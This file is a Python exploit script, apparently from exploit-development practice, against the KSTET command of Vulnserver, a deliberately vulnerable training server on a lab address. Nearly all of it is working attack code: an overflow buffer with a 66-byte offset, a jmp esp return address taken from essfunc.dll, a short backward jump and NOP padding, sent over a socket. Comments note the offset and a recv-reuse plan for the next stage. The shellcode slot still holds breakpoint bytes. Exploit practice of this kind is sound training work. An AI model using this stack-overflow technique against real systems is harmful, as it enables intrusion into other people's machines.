#!/usr/bin/env python3
#https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/
#CALL 0040252C
#00401953  

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from sys import exit

# CONSTANTS
rhost = "10.10.11.10"
rport = 9999
target = (rhost, rport)
timeout_val = 10  # seconds

# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 41326341
# [*] Exact match at offset 66
#exploit = b"\x90" * 66
exploit = b"\xCC" * 66

# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll]
# ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0-
# \\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll
exploit += pack("<L", 0x62501203)
# 00B7FA0C  ^EB B8            JMP SHORT 00B7F9C6
# JMP -72 (decimal) bytes
exploit += b"\xEB\xB8"
#exploit += b"\x90" * 18
exploit += b"\x90" * 18

payload = b"KSTET /.:/"
payload += exploit

if __name__ == '__main__':
    print('[*] creating the socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the target')
        s.connect(target)
        print('[*] sending exploit')
        s.send(payload)
        print('[*] cleaning up')
        s.close()
    except timeout:
        print('[!] socket timeout occurred, is the application running?')
        print('\tensure the debugger is not in a paused state')
        exit(1)
    except error:
        print('[!] a socket error occurred, is the host up?')
        exit(1)




#To do this, we just take the current address of the socket (0x011DFB50) 
#and subtract the address that $esp is pointing at (0x011DF9C8),
# which leaves us with a value of 0x188,
# meaning the socket can be found at $esp+0x188.
#
#need to implement this in the meantime ( from rastating), to dynamically find
#the address
